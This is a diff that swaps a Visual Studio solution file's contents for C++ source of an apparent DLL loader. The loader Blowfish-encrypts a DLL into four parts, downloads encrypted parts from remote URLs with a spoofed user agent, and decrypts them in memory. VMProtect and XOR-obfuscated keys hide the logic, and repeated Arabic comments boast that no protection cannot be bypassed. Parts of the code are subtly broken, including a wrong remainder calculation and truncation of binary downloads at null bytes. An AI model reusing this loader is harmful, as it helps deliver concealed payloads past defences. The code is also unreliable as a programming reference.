@@ -1,32 +1,216 @@
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+#include <filesystem>
+#include <sstream>
+#include <WinInet.h>
+#pragma comment(lib, "Wininet.lib")
+#include "blowfish\blowfish.h"
+#include "Encrypted_Streamer.h"
+#include "skStr.h"
+#include "Communication/xor.h"
+//#include "../Extra Headers/vmprotect.h"
 
-Microsoft Visual Studio Solution File, Format Version 12.00
-# Visual Studio Version 16
-VisualStudioVersion = 16.0.31624.102
-MinimumVisualStudioVersion = 10.0.40219.1
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "example", "example.vcxproj", "{3E584710-D844-49E5-9938-B4EFA4928B17}"
-EndProject
-Global
-	GlobalSection(SolutionConfigurationPlatforms) = preSolution
-		Debug|x64 = Debug|x64
-		Debug|x86 = Debug|x86
-		Release|x64 = Release|x64
-		Release|x86 = Release|x86
-	EndGlobalSection
-	GlobalSection(ProjectConfigurationPlatforms) = postSolution
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Debug|x64.ActiveCfg = Debug|x64
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Debug|x64.Build.0 = Debug|x64
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Debug|x86.ActiveCfg = Debug|Win32
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Debug|x86.Build.0 = Debug|Win32
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Release|x64.ActiveCfg = Release|x64
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Release|x64.Build.0 = Release|x64
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Release|x86.ActiveCfg = Release|Win32
-		{3E584710-D844-49E5-9938-B4EFA4928B17}.Release|x86.Build.0 = Release|Win32
-	EndGlobalSection
-	GlobalSection(SolutionProperties) = preSolution
-		HideSolutionNode = FALSE
-	EndGlobalSection
-	GlobalSection(ExtensibilityGlobals) = postSolution
-		SolutionGuid = {9EE66AFE-8CA5-4A35-9001-B4A57E4493E3}
-	EndGlobalSection
-EndGlobal
+using namespace std;
 
+
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+
+BLOWFISH blowfish1(xor_a("5596442113857917"));
+BLOWFISH blowfish2(xor_a("9460853456238055"));
+BLOWFISH blowfish3(xor_a("1798792819739505"));
+BLOWFISH blowfish4(xor_a("2238198249789355"));
+
+//Split our dropped file into "x" amount of pieces and encrypt each one with their own key.
+
+void Encrypt(fs::path dropped)
+{
+	//Protect();
+	//open the file stream
+	ifstream ifs(dropped.c_str(), ios::binary | ios::ate);
+
+	//get the file size
+	int fileSize = ifs.tellg();
+	ifs.seekg(0, ios::beg);
+
+	string data = string(istreambuf_iterator<char>(ifs), istreambuf_iterator<char>());
+
+	//How many parts are we wanting to split our DLL into?
+	size_t partSize = (fileSize) / 4;
+	size_t remainder = (fileSize) % 4;
+	//Just fill the last part with the remainder if there is overflow.
+	size_t lastPartSize = partSize - remainder;
+
+	//Math for the indivual parts to be split into their respective buffers.
+	string part1Buffer(data.begin() + partSize * 0, data.begin() + partSize * 0 + partSize);
+	string part2Buffer(data.begin() + partSize * 1, data.begin() + partSize * 1 + partSize);
+	string part3Buffer(data.begin() + partSize * 2, data.begin() + partSize * 2 + partSize);
+	string part4Buffer(data.begin() + partSize * 3, data.begin() + partSize * 3 + lastPartSize);
+
+	//Just uses Blowfish for now. We can add our own encryption methods later. Hopefully a different one for each part.
+	string part1BufferEncrypted = blowfish1.Encrypt_CBC(part1Buffer);
+	string part2BufferEncrypted = blowfish2.Encrypt_CBC(part2Buffer);
+	string part3BufferEncrypted = blowfish3.Encrypt_CBC(part3Buffer);
+	string part4BufferEncrypted = blowfish4.Encrypt_CBC(part4Buffer);
+
+	//write the encrypted parts to disk for testing
+	ofstream ofs;
+	ofs.open(L"1", ios::binary);
+	copy(part1BufferEncrypted.begin(), part1BufferEncrypted.end(), ostream_iterator<char>(ofs));
+	ofs.close();
+	ofs.open(L"2", ios::binary);
+	copy(part2BufferEncrypted.begin(), part2BufferEncrypted.end(), ostream_iterator<char>(ofs));
+	ofs.close();
+	ofs.open(L"3", ios::binary);
+	copy(part3BufferEncrypted.begin(), part3BufferEncrypted.end(), ostream_iterator<char>(ofs));
+	ofs.close();
+	ofs.open(L"4", ios::binary);
+	copy(part4BufferEncrypted.begin(), part4BufferEncrypted.end(), ostream_iterator<char>(ofs));
+	ofs.close();
+	//ProtectEnd();
+}
+
+//Decrypt the DLL if part 1 of the encrypted arrays is dropped on the exe.
+
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+// استمتعو بالسوورس 
+// ماافيه حمايه الا ونقدر نتخطاها  (:
+
+void DecryptLocalFiles(fs::path dropped)
+{
+	//Protect();
+	//Auto-select the directory that the DLL was drug from.
+	fs::path dir = dropped.remove_filename();
+
+	// استمتعو بالسوورس 
+
+
+	//Read each file into a string.
+	ifstream ifs(dir / L"1", ios::binary);
+	string data1 = string(istreambuf_iterator<char>(ifs), istreambuf_iterator<char>());
+	ifs.close();
+
+	ifs.open(dir / L"2", ios::binary);
+	string data2 = string(istreambuf_iterator<char>(ifs), istreambuf_iterator<char>());
+	ifs.close();
+
+	ifs.open(dir / L"3", ios::binary);
+	string data3 = string(istreambuf_iterator<char>(ifs), istreambuf_iterator<char>());
+	ifs.close();
+
+	ifs.open(dir / L"4", ios::binary);
+	string data4 = string(istreambuf_iterator<char>(ifs), istreambuf_iterator<char>());
+	ifs.close();
+
+	//Decrypt each part.
+	string part1BufferDecrypted = blowfish1.Decrypt_CBC(data1);
+	string part2BufferDecrypted = blowfish2.Decrypt_CBC(data2);
+	string part3BufferDecrypted = blowfish3.Decrypt_CBC(data3);
+	string part4BufferDecrypted = blowfish4.Decrypt_CBC(data4);
+
+	//Test to make sure it encrypts and decrypts correctly.
+	//bool result = equal(part1Buffer.begin(), part1Buffer.end(), part1BufferDecrypted.begin(), part1BufferDecrypted.end());
+
+	//Rebuild the DLL from decrypted data.
+	ofstream ofs;
+	ofs.open(L"not_needed.exe", ios::binary);
+	copy(part1BufferDecrypted.begin(), part1BufferDecrypted.end(), ostream_iterator<char>(ofs));
+	copy(part2BufferDecrypted.begin(), part2BufferDecrypted.end(), ostream_iterator<char>(ofs));
+	copy(part3BufferDecrypted.begin(), part3BufferDecrypted.end(), ostream_iterator<char>(ofs));
+	copy(part4BufferDecrypted.begin(), part4BufferDecrypted.end(), ostream_iterator<char>(ofs));
+	ofs.close();
+	//ProtectEnd();
+}
+
+//Passes the downloaded, ecrypted parts through their respective keys and returns the clean arrays.
+
+string Decrypt(EncryptedData_t encryptedData)
+{
+	//Protect();
+	//Decrypt each part
+	VMProtectBeginUltra("DecryptBlowfish");
+	string BufferDecrypted = blowfish1.Decrypt_CBC(encryptedData.a);
+	BufferDecrypted += blowfish2.Decrypt_CBC(encryptedData.b);
+	BufferDecrypted += blowfish3.Decrypt_CBC(encryptedData.c);
+	BufferDecrypted += blowfish4.Decrypt_CBC(encryptedData.d);
+	VMProtectEnd();
+	//ProtectEnd();
+	return BufferDecrypted;
+}
+
+//Stream a file from a URL to a byte buffer or a defined size.
+
+string StreamFileToMemString(const char* URL)
+{
+	
+	const char* header = "Accept: *" "/" "*\r\n\r\n";
+	HANDLE hBrowser = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	HANDLE hURL = InternetOpenUrl(hBrowser, URL, header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);
+
+	
+	char* dllBuff = new char[100000000]; //100mb
+
+	
+	memset(dllBuff, 0, 100000000);
+
+
+	DWORD BytesRead = 1;
+
+	string data;
+
+	if (InternetReadFile(hURL, dllBuff, 100000000, &BytesRead))
+	{
+		data = string(dllBuff);
+	}
+
+	delete[] dllBuff;
+
+	InternetCloseHandle(hBrowser);
+	InternetCloseHandle(hURL);
+
+	return data;
+}
+
+//Define our URLs to download our parts from and in what order to arrange them.
+
+
+string GetDecryptedDLL(const char* link1, const char* link2, const char* link3, const char* link4)
+{
+	VMProtectBeginUltra("DecryptFunction");
+	string data1 = StreamFileToMemString(link1);
+	string data2 = StreamFileToMemString(link2);
+	string data3 = StreamFileToMemString(link3);
+	string data4 = StreamFileToMemString(link4);
+
+	string decryptedDLL = Decrypt({ data1, data2, data3, data4 });
+	VMProtectEnd();
+	return decryptedDLL;
+}
